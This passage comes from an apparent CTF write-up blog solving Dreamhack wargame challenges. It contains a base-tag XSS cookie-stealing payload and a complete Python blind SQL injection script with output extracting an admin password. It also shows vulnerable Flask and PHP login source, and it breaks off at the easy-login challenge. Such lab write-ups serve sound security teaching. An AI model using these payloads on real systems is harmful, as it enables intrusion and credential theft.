<li>It defines routes that handle different URL requests (<code>/</code>, <code>/vuln</code>, <code>/flag</code>, <code>/memo</code>).</li>
<li>The <code>nonce</code> value is generated using <code>os.urandom(16).hex()</code> to create a cryptographically secure random string.</li>
<li>The <code>add_header</code> decorator function is used to set the <code>Content-Security-Policy</code> (CSP) header for every response. This header includes the generated <code>nonce</code> value for inline scripts.</li>
<li>The routes (<code>/</code>, <code>/vuln</code>, <code>/flag</code>, <code>/memo</code>) use the <code>render_template</code> function to render HTML templates based on templates like <code>index.html</code>, <code>vuln.html</code>, <code>flag.html</code>, and <code>memo.html</code>. These templates inherit the base layout and functionality from <code>base.html</code>.</li>
</ul>
<p>Using the <code>render_template</code> parameter settings, we successfully transferred the back-end data to the front-end. We also learned that we can use <code>&#123;&#123; parameters &#125;&#125;</code> on the html file to receive the data from the back-end.</p>
<p><a target="_blank" rel="noopener" href="https://developer.mozilla.org/zh-TW/docs/Web/HTML/Element/base">https://developer.mozilla.org/zh-TW/docs/Web/HTML/Element/base</a></p>
<p><a target="_blank" rel="noopener" href="https://dreamhack.io/wargame/writeups/9659">https://dreamhack.io/wargame/writeups/9659</a></p>
<p>In short, you need to open a web server and then forge one of the two files <code>jquery.min.js</code> and <code>bootstrap.min.js</code>. First create <code>/static/js/jquery.min.js</code> and write it in the file.</p>
<figure class="highlight jsx"><table><tr><td class="code"><pre><span class="line">location.<span class="property">href</span>=<span class="string">&#x27;http://127.0.0.1:8000/memo?memo=&#x27;</span>+<span class="variable language_">document</span>.<span class="property">cookie</span></span><br></pre></td></tr></table></figure>

<p>Go to the flag page and enter <code>&lt;base href=&#39;https://yourwebserverdomainorip&gt;</code></p>
<p><strong>How to set up a personal server?</strong> </p>
<p>A GitHub Page can be created. When you create a repository named “[username].github.io” on Github, the repository will be hosted via the URL https: &#x2F;&#x2F;The website accessed by [username].github.io. </p>
<hr>
<h3 id="blind-sql-injection-advanced"><a href="#blind-sql-injection-advanced" class="headerlink" title="blind sql injection advanced"></a><strong>blind sql injection advanced</strong></h3><ul>
<li><strong>Description</strong></li>
</ul>
<p><strong>Exercise: Blind SQL Injection Advanced에서 실습하는 문제입니다.</strong></p>
<p><strong>관리자의 비밀번호는 “아스키코드”와 “한글”로 구성되어 있습니다.</strong></p>
<ul>
<li><strong>문제 수정 내역</strong></li>
</ul>
<p><strong>2023.07.20 Dockerfile 제공</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="meta">#! /usr/bin/env bash</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">export</span> MYSQL_USER=dbuser </span><br><span class="line"><span class="built_in">export</span> MYSQL_PASSWORD=dbpass</span><br><span class="line"></span><br><span class="line">/usr/bin/mysqld_safe --timezone=<span class="variable">$&#123;DATE_TIMEZONE&#125;</span>&amp;</span><br><span class="line">python app.py</span><br></pre></td></tr></table></figure>

<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="operator">*</span><span class="operator">*</span><span class="keyword">CREATE</span> DATABASE user_db <span class="keyword">CHARACTER SET</span> utf8;<span class="operator">*</span><span class="operator">*</span></span><br><span class="line"><span class="keyword">GRANT</span> <span class="keyword">ALL</span> PRIVILEGES <span class="keyword">ON</span> user_db.<span class="operator">*</span> <span class="keyword">TO</span> <span class="string">&#x27;dbuser&#x27;</span>@<span class="string">&#x27;localhost&#x27;</span> IDENTIFIED <span class="keyword">BY</span> <span class="string">&#x27;dbpass&#x27;</span>;</span><br><span class="line"></span><br><span class="line">USE `user_db`;</span><br><span class="line"><span class="keyword">CREATE TABLE</span> users (</span><br><span class="line">  idx <span class="type">int</span> auto_increment <span class="keyword">primary key</span>,</span><br><span class="line">  uid <span class="type">varchar</span>(<span class="number">128</span>) <span class="keyword">not null</span>,</span><br><span class="line">  upw <span class="type">varchar</span>(<span class="number">128</span>) <span class="keyword">not null</span></span><br><span class="line">);</span><br><span class="line"></span><br><span class="line"><span class="keyword">INSERT INTO</span> users (uid, upw) <span class="keyword">values</span> (<span class="string">&#x27;admin&#x27;</span>, <span class="string">&#x27;DH&#123;**FLAG**&#125;&#x27;</span>);</span><br><span class="line"><span class="keyword">INSERT INTO</span> users (uid, upw) <span class="keyword">values</span> (<span class="string">&#x27;guest&#x27;</span>, <span class="string">&#x27;guest&#x27;</span>);</span><br><span class="line"><span class="keyword">INSERT INTO</span> users (uid, upw) <span class="keyword">values</span> (<span class="string">&#x27;test&#x27;</span>, <span class="string">&#x27;test&#x27;</span>);</span><br><span class="line">FLUSH PRIVILEGES;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request, render_template_string</span><br><span class="line"><span class="keyword">from</span> flask_mysqldb <span class="keyword">import</span> MySQL</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line">app.config[<span class="string">&#x27;MYSQL_HOST&#x27;</span>] = os.environ.get(<span class="string">&#x27;MYSQL_HOST&#x27;</span>, <span class="string">&#x27;localhost&#x27;</span>)</span><br><span class="line">app.config[<span class="string">&#x27;MYSQL_USER&#x27;</span>] = os.environ.get(<span class="string">&#x27;MYSQL_USER&#x27;</span>, <span class="string">&#x27;user&#x27;</span>)</span><br><span class="line">app.config[<span class="string">&#x27;MYSQL_PASSWORD&#x27;</span>] = os.environ.get(<span class="string">&#x27;MYSQL_PASSWORD&#x27;</span>, <span class="string">&#x27;pass&#x27;</span>)</span><br><span class="line">app.config[<span class="string">&#x27;MYSQL_DB&#x27;</span>] = os.environ.get(<span class="string">&#x27;MYSQL_DB&#x27;</span>, <span class="string">&#x27;user_db&#x27;</span>)</span><br><span class="line">mysql = MySQL(app)</span><br><span class="line"></span><br><span class="line">template =<span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">&lt;pre style=&quot;font-size:200%&quot;&gt;SELECT * FROM users WHERE uid=&#x27;&#123;&#123;uid&#125;&#125;&#x27;;&lt;/pre&gt;&lt;hr/&gt;</span></span><br><span class="line"><span class="string">&lt;form&gt;</span></span><br><span class="line"><span class="string">    &lt;input tyupe=&#x27;text&#x27; name=&#x27;uid&#x27; placeholder=&#x27;uid&#x27;&gt;</span></span><br><span class="line"><span class="string">    &lt;input type=&#x27;submit&#x27; value=&#x27;submit&#x27;&gt;</span></span><br><span class="line"><span class="string">&lt;/form&gt;</span></span><br><span class="line"><span class="string">&#123;% if nrows == 1%&#125;</span></span><br><span class="line"><span class="string">    &lt;pre style=&quot;font-size:150%&quot;&gt;user &quot;&#123;&#123;uid&#125;&#125;&quot; exists.&lt;/pre&gt;</span></span><br><span class="line"><span class="string">&#123;% endif %&#125;</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    uid = request.args.get(<span class="string">&#x27;uid&#x27;</span>, <span class="string">&#x27;&#x27;</span>)</span><br><span class="line">    nrows = <span class="number">0</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> uid:</span><br><span class="line">        cur = mysql.connection.cursor()</span><br><span class="line">        nrows = cur.execute(<span class="string">f&quot;SELECT * FROM users WHERE uid=&#x27;<span class="subst">&#123;uid&#125;</span>&#x27;;&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> render_template_string(template, uid=uid, nrows=nrows)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>when user input uid like admin、guest、test, these user is exists</p>
<p><a target="_blank" rel="noopener" href="http://host3.dreamhack.games:13635/?uid=test">http://host3.dreamhack.games:13635/?uid=test</a></p>
<p><img src="/img/Dreamhack1_36.png" alt="Untitled"></p>
<p><img src="/img/Dreamhack1_37.png" alt="Untitled"></p>
<p><img src="/img/Dreamhack1_38.png" alt="Untitled"></p>
<p>we can notice here</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">INSERT INTO users (uid, upw) values (<span class="string">&#x27;admin&#x27;</span>, <span class="string">&#x27;DH&#123;**FLAG**&#125;&#x27;</span>);</span><br><span class="line">INSERT INTO users (uid, upw) values (<span class="string">&#x27;guest&#x27;</span>, <span class="string">&#x27;guest&#x27;</span>);</span><br><span class="line">INSERT INTO users (uid, upw) values (<span class="string">&#x27;test&#x27;</span>, <span class="string">&#x27;test&#x27;</span>);</span><br></pre></td></tr></table></figure>

<p>when uid is admin then upw will output the flag</p>
<p><code>**uid</code>** Maximum length is 128 characters. It represents the user’s account name</p>
<p><strong><code>upw</code> The maximum length is also 128 characters. It represents the user’s password</strong></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">uid varchar(<span class="number">128</span>) <span class="keyword">not</span> null</span><br><span class="line">upw varchar(<span class="number">128</span>) <span class="keyword">not</span> null</span><br></pre></td></tr></table></figure>

<p>The definition of “varchar(128)” refers to the maximum number of characters that this field can hold, which is 128, rather than the number of bits. In other words, this field can store up to <code>128 characters</code>, regardless of the specific encoding of those characters or the number of bits they occupy.</p>
<p>According to the title</p>
<p><code>The administrator password consists of &quot;ASCII code&quot; and &quot;Korean&quot;.</code></p>
<p>we are not sure which combination the password is. It may be both. </p>
<p>To determine, you need to find out the length of each character when expressed as a bit string.</p>
<ul>
<li>ASCII → 1 byte (&#x3D;8 bits)</li>
<li>Korean → 3 bytes per character (&#x3D;24 bits)</li>
</ul>
<p>Summarize what needs to be done</p>
<ul>
<li>Find the administrator password length<ul>
<li>Attempts to determine the password length of the administrator account by sending a corresponding request</li>
</ul>
</li>
<li>Extract the bit string of each character<ul>
<li>Extracts the bit string for each character in the password based on <code>UTF-8 encoding</code>.</li>
</ul>
</li>
<li>Convert bit strings to characters<ul>
<li>Convert bit strings to corresponding characters for subsequent comparison and analysis.</li>
<li>In order to present the data in a more readable form</li>
<li>Bit strings represent binary data. Converting them to characters can present these data in readable character form</li>
</ul>
</li>
<li>Convert bit string to integer<ul>
<li>Converts a bit string to an integer and to a character in Big Endian format.</li>
<li>To convert binary data represented by bit strings into integer form for numerical comparison or other calculations</li>
</ul>
</li>
<li>Convert to <code>Big Endian</code> format characters<ul>
<li>Big Endian is a byte order (byte order) representation in which higher-order bytes are stored at lower addresses</li>
<li>When representing numerical values, especially in cross-platform or network communication, the data needs to be expressed in a unified byte order to ensure the accuracy and consistency of the data</li>
<li>When converting a bit string to an integer, it may be necessary to represent it in Big Endian format so that the data can be accurately interpreted and compared between different systems</li>
</ul>
</li>
<li>Convert to matching encoding<ul>
<li>Make sure that the converted characters use the correct character encoding and confirm the correctness of the conversion by verifying the representation and content of the characters</li>
</ul>
</li>
</ul>
<p>Exploit:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> requests <span class="keyword">import</span> get</span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"></span><br><span class="line"><span class="comment">#INSERT INTO users (uid, upw) values (&#x27;admin&#x27;, &#x27;DH&#123;**FLAG**&#125;&#x27;);</span></span><br><span class="line"><span class="comment">#SELECT * FROM users WHERE uid=&#x27;&#123;uid&#125;</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">find_password_length</span>(<span class="params">url</span>):</span><br><span class="line">    password_length = <span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        password_length += <span class="number">1</span></span><br><span class="line">        qry = <span class="string">f&quot;admin&#x27; AND CHAR_LENGTH(upw) = <span class="subst">&#123;password_length&#125;</span>-- &quot;</span></span><br><span class="line">        r = get(<span class="string">f&quot;<span class="subst">&#123;url&#125;</span>/?uid=<span class="subst">&#123;qry&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;exists&quot;</span> <span class="keyword">in</span> r.text:<span class="comment">#If the returned content contains the &quot;exists&quot; string, it means that the assumed password length is correct.</span></span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">return</span> password_length</span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">This find_password_length func works by sending an HTTP request, including snippets of a SQL query, and then observing what is returned by the web page. If the SQL query returns results that contain expected results, such as the &quot;exists&quot; string, the content returned by the web page will be different. Based on this difference, the program can determine whether certain conditions are true and then infer some hidden information, such as the length of the password or the bit string.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">find_char_bitstream_length</span>(<span class="params">url, position</span>):</span><br><span class="line">    bit_length = <span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        bit_length += <span class="number">1</span></span><br><span class="line">        qry = <span class="string">f&quot;admin&#x27; AND LENGTH(BIN(ORD(SUBSTRING(upw, <span class="subst">&#123;position&#125;</span>, 1)))) = <span class="subst">&#123;bit_length&#125;</span>-- &quot;</span></span><br><span class="line">        r = get(<span class="string">f&quot;<span class="subst">&#123;url&#125;</span>/?uid=<span class="subst">&#123;qry&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;exists&quot;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">return</span> bit_length</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">find_char_bitstream</span>(<span class="params">url, position, bit_length</span>):</span><br><span class="line">    bits = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, bit_length + <span class="number">1</span>):</span><br><span class="line">        qry = <span class="string">f&quot;admin&#x27; AND SUBSTRING(BIN(ORD(SUBSTRING(upw, <span class="subst">&#123;position&#125;</span>, 1))), <span class="subst">&#123;j&#125;</span>, 1) = &#x27;1&#x27;-- &quot;</span></span><br><span class="line">        r = get(<span class="string">f&quot;<span class="subst">&#123;url&#125;</span>/?uid=<span class="subst">&#123;qry&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;exists&quot;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">            bits += <span class="string">&quot;1&quot;</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            bits += <span class="string">&quot;0&quot;</span></span><br><span class="line">    <span class="keyword">return</span> bits</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">decode_bitstream</span>(<span class="params">bits</span>):</span><br><span class="line">    <span class="keyword">return</span> binascii.unhexlify(<span class="string">&#x27;%x&#x27;</span> % <span class="built_in">int</span>(bits, <span class="number">2</span>)).decode(<span class="string">&quot;utf-8&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    url = <span class="string">&quot;http://host3.dreamhack.games:19732/&quot;</span></span><br><span class="line">    password_length = find_password_length(url)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;Password Length is <span class="subst">&#123;password_length&#125;</span> (bits)&quot;</span>)</span><br><span class="line"></span><br><span class="line">    password = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, password_length + <span class="number">1</span>):</span><br><span class="line">        bit_length = find_char_bitstream_length(url, i)</span><br><span class="line">        bits = find_char_bitstream(url, i, bit_length)</span><br><span class="line">        password += decode_bitstream(bits)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;i&#125;</span> - <span class="subst">&#123;password&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;Finally Password is &gt;&gt; <span class="subst">&#123;password&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    main()</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">Password Length <span class="keyword">is</span> <span class="number">13</span> (bits)</span><br><span class="line"><span class="number">1</span> - D</span><br><span class="line"><span class="number">2</span> - DH</span><br><span class="line"><span class="number">3</span> - DH&#123;</span><br><span class="line"><span class="number">4</span> - DH&#123;이</span><br><span class="line"><span class="number">5</span> - DH&#123;이것</span><br><span class="line"><span class="number">6</span> - DH&#123;이것이</span><br><span class="line"><span class="number">7</span> - DH&#123;이것이비</span><br><span class="line"><span class="number">8</span> - DH&#123;이것이비밀</span><br><span class="line"><span class="number">9</span> - DH&#123;이것이비밀번</span><br><span class="line"><span class="number">10</span> - DH&#123;이것이비밀번호</span><br><span class="line"><span class="number">11</span> - DH&#123;이것이비밀번호!</span><br><span class="line"><span class="number">12</span> - DH&#123;이것이비밀번호!?</span><br><span class="line"><span class="number">13</span> - DH&#123;이것이비밀번호!?&#125;</span><br><span class="line">Finally Password <span class="keyword">is</span> &gt;&gt; DH&#123;이것이비밀번호!?&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li><strong><code>admin&#39; AND ...</code></strong><ul>
<li>Filter the data in the target database to ensure that we only check data in the target database that meets certain criteria</li>
</ul>
</li>
<li><strong><code>SUBSTRING(upw, &#123;position&#125;, 1)</code></strong><ul>
<li><strong>Extracts a character</strong> at a specific position ({position}) from the upw field</li>
</ul>
</li>
<li><strong><code>ORD(SUBSTRING(...))</code></strong><ul>
<li>Converts the <strong>extracted characters</strong> into their corresponding <code>ASCII encoded</code> values</li>
</ul>
</li>
<li><strong><code>BIN(ORD(...))</code></strong><ul>
<li>Converts an ASCII encoded value to a <code>binary</code> representation of a bit string</li>
</ul>
</li>
<li><strong><code>SUBSTRING(BIN(...), &#123;j&#125;, 1)</code></strong><ul>
<li>Extracts a bit at a specific position ({j}) from a bit string</li>
</ul>
</li>
</ul>
<hr>
<h3 id="easy-login"><a href="#easy-login" class="headerlink" title="easy-login"></a><strong>easy-login</strong></h3><ul>
<li><strong>Description</strong></li>
</ul>
<p><strong>관리자로 로그인하여 플래그를 획득하세요!</strong></p>
<p><strong>플래그 형식은 <code>DH&#123;...&#125;</code> 입니다.</strong></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&lt;form id=<span class="string">&quot;redir&quot;</span> action=<span class="string">&quot;index.php&quot;</span> method=<span class="string">&quot;post&quot;</span>&gt;</span><br><span class="line">    <span class="meta">&lt;?php</span></span><br><span class="line">    <span class="variable">$a</span> = <span class="keyword">array</span>();</span><br><span class="line">    <span class="keyword">foreach</span> (<span class="variable">$_POST</span> <span class="keyword">as</span> <span class="variable">$k</span> =&gt; <span class="variable">$v</span>) &#123;</span><br><span class="line">        <span class="variable">$a</span>[<span class="variable">$k</span>] = <span class="variable">$v</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$j</span> = <span class="title function_ invoke__">json_encode</span>(<span class="variable">$a</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;&lt;input type=&quot;hidden&quot; name=&quot;cred&quot; value=&quot;&#x27;</span> . <span class="title function_ invoke__">base64_encode</span>(<span class="variable">$j</span>) . <span class="string">&#x27;&quot;&gt;&#x27;</span>;</span><br><span class="line">    <span class="meta">?&gt;</span></span><br><span class="line">&lt;/form&gt;</span><br><span class="line"></span><br><span class="line">&lt;script type=<span class="string">&quot;text/javascript&quot;</span>&gt;</span><br><span class="line">    document.<span class="title function_ invoke__">getElementById</span>(<span class="string">&#x27;redir&#x27;</span>).<span class="title function_ invoke__">submit</span>();</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure>

<p>This piece of PHP handles the collection and processing of user-submitted information. It uses <strong>foreach</strong> to loop through all key-value pairs in <strong>$_POST</strong> and stores them in an associative array <strong>$a</strong>. Then, it uses the <strong>json_encode()</strong> function to convert the entire array into a JSON-formatted string, and Base64-encodes the JSON string.</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">generatePassword</span>(<span class="params"><span class="variable">$length</span></span>) </span>&#123;</span><br><span class="line">    <span class="variable">$characters</span> = <span class="string">&#x27;0123456789abcdef&#x27;</span>;</span><br><span class="line">    <span class="variable">$charactersLength</span> = <span class="title function_ invoke__">strlen</span>(<span class="variable">$characters</span>);</span><br><span class="line">    <span class="variable">$pw</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="variable">$length</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line">        <span class="variable">$pw</span> .= <span class="variable">$characters</span>[<span class="title function_ invoke__">random_int</span>(<span class="number">0</span>, <span class="variable">$charactersLength</span> - <span class="number">1</span>)];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$pw</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">generateOTP</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;P&#x27;</span> . <span class="title function_ invoke__">str_pad</span>(<span class="title function_ invoke__">strval</span>(<span class="title function_ invoke__">random_int</span>(<span class="number">0</span>, <span class="number">999999</span>)), <span class="number">6</span>, <span class="string">&quot;0&quot;</span>, STR_PAD_LEFT);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$admin_pw</span> = <span class="title function_ invoke__">generatePassword</span>(<span class="number">32</span>);</span><br><span class="line"><span class="variable">$otp</span> = <span class="title function_ invoke__">generateOTP</span>();</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">login</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (!<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;cred&#x27;</span>])) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Please login...&quot;</span>;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!(<span class="variable">$cred</span> = <span class="title function_ invoke__">base64_decode</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;cred&#x27;</span>]))) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Cred error&quot;</span>;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!(<span class="variable">$cred</span> = <span class="title function_ invoke__">json_decode</span>(<span class="variable">$cred</span>, <span class="literal">true</span>))) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Cred error&quot;</span>;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!(<span class="keyword">isset</span>(<span class="variable">$cred</span>[<span class="string">&#x27;id&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$cred</span>[<span class="string">&#x27;pw&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$cred</span>[<span class="string">&#x27;otp&#x27;</span>]))) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Cred error&quot;</span>;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$cred</span>[<span class="string">&#x27;id&#x27;</span>] != <span class="string">&#x27;admin&#x27;</span>) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Hello,&quot;</span> . <span class="variable">$cred</span>[<span class="string">&#x27;id&#x27;</span>];</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$cred</span>[<span class="string">&#x27;otp&#x27;</span>] != <span class="variable">$GLOBALS</span>[<span class="string">&#x27;otp&#x27;</span>]) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;OTP fail&quot;</span>;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!<span class="title function_ invoke__">strcmp</span>(<span class="variable">$cred</span>[<span class="string">&#x27;pw&#x27;</span>], <span class="variable">$GLOBALS</span>[<span class="string">&#x27;admin_pw&#x27;</span>])) &#123;</span><br><span class="line">        <span class="keyword">require_once</span>(<span class="string">&#x27;flag.php&#x27;</span>);</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Hello, admin! get the flag: &quot;</span> . <span class="variable">$flag</span>;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;Password fail&quot;</span>;</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;link rel=<span class="string">&quot;stylesheet&quot;</span> type=<span class="string">&quot;text/css&quot;</span> href=<span class="string">&quot;style.css&quot;</span>&gt;</span><br><span class="line">    &lt;title&gt;Easy Login&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">    &lt;div <span class="class"><span class="keyword">class</span>=&quot;<span class="title">login</span>-<span class="title">container</span>&quot;&gt;</span></span><br><span class="line"><span class="class">        &lt;<span class="title">h2</span>&gt;<span class="title">Login</span> <span class="title">as</span> <span class="title">admin</span> <span class="title">to</span> <span class="title">get</span> <span class="title">flag</span>&lt;<span class="title">h2</span>&gt;</span></span><br><span class="line"><span class="class">        &lt;<span class="title">form</span> <span class="title">action</span>=&quot;<span class="title">login</span>.<span class="title">php</span>&quot; <span class="title">method</span>=&quot;<span class="title">post</span>&quot;&gt;</span></span><br><span class="line"><span class="class">            &lt;<span class="title">div</span> <span class="title">class</span>=&quot;<span class="title">form</span>-<span class="title">group</span>&quot;&gt;</span></span><br><span class="line"><span class="class">                &lt;<span class="title">label</span> <span class="title">for</span>=&quot;<span class="title">id</span>&quot;&gt;<span class="title">ID</span>&lt;/<span class="title">label</span>&gt;</span></span><br><span class="line"><span class="class">                &lt;<span class="title">input</span> <span class="title">type</span>=&quot;<span class="title">text</span>&quot; <span class="title">name</span>=&quot;<span class="title">id</span>&quot;&gt;&lt;/<span class="title">br</span>&gt;</span></span><br><span class="line"><span class="class">            &lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class">            &lt;<span class="title">div</span> <span class="title">class</span>=&quot;<span class="title">form</span>-<span class="title">group</span>&quot;&gt;</span></span><br><span class="line"><span class="class">                &lt;<span class="title">label</span> <span class="title">for</span>=&quot;<span class="title">pw</span>&quot;&gt;<span class="title">PW</span>&lt;/<span class="title">label</span>&gt;</span></span><br><span class="line"><span class="class">                &lt;<span class="title">input</span> <span class="title">type</span>=&quot;<span class="title">text</span>&quot; <span class="title">name</span>=&quot;<span class="title">pw</span>&quot;&gt;&lt;/<span class="title">br</span>&gt;</span></span><br><span class="line"><span class="class">            &lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class">            &lt;<span class="title">div</span> <span class="title">class</span>=&quot;<span class="title">form</span>-<span class="title">group</span>&quot;&gt;</span></span><br><span class="line"><span class="class">                &lt;<span class="title">label</span> <span class="title">for</span>=&quot;<span class="title">otp</span>&quot;&gt;<span class="title">OTP</span>&lt;/<span class="title">label</span>&gt;</span></span><br><span class="line"><span class="class">                &lt;<span class="title">input</span> <span class="title">type</span>=&quot;<span class="title">text</span>&quot; <span class="title">name</span>=&quot;<span class="title">otp</span>&quot;&gt;&lt;/<span class="title">br</span>&gt;</span></span><br><span class="line"><span class="class">            &lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class">            &lt;<span class="title">button</span> <span class="title">type</span>=&quot;<span class="title">submit</span>&quot; <span class="title">class</span>=&quot;<span class="title">button</span>&quot;&gt;<span class="title">Login</span>&lt;/<span class="title">button</span>&gt;</span></span><br><span class="line"><span class="class">        &lt;/<span class="title">form</span>&gt;</span></span><br><span class="line"><span class="class">        &lt;<span class="title">div</span> <span class="title">class</span>=&quot;<span class="title">message</span>&quot;&gt;</span></span><br><span class="line"><span class="class">            &lt;?<span class="title">php</span> <span class="title">login</span>(); ?&gt;</span></span><br><span class="line"><span class="class">        &lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class">    &lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class">&lt;/<span class="title">body</span>&gt;</span></span><br><span class="line"><span class="class">&lt;/<span class="title">html</span>&gt;</span></span><br><span class="line"><span class="class"></span></span><br></pre></td></tr></table></figure>

<p><img src="/img/Dreamhack1_39.png" alt="Untitled"></p>
